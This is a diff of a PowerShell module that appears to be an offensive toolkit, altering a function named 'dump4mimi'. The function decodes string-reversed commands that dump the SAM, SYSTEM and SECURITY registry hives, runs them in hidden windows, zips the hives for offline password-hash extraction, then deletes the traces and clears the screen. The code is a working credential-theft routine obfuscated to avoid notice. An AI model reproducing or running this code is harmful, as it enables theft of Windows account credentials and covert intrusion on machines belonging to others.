@@ -82,24 +82,24 @@ Export-ModuleMember -Function getwifipass
 Set-Alias -Name getwifipass -Value getwifipass
 
 function dump4mimi {
-        $ax3 = 'y/ "mas\:C" "mas\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(1.0)
-	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(1.2)
 	$ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-    Clear-Host
-   sleep(9.8)
+	sleep(5.5)
+	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+	start-process cmd "/c $sp1k3 " -WindowStyle hidden
+	sleep(3.5)
+	$ax3 = 'y/ "mas\:C" "mas\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+	start-process cmd "/c $sp1k3 " -WindowStyle hidden
+    clear
+    sleep(1.5)
     cd C:\
     Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
-  sleep(1.0)
-    Clear-Host
+    sleep(0.5)
+    clear
 	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
 	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
 	Remove-Item -Path "C:\security" -force -ErrorAction SilentlyContinue
-    Clear-Host
+    clear
 }
 Export-ModuleMember -Function dump4mimi
 Set-Alias -Name dump4mimi -Value dump4mimi
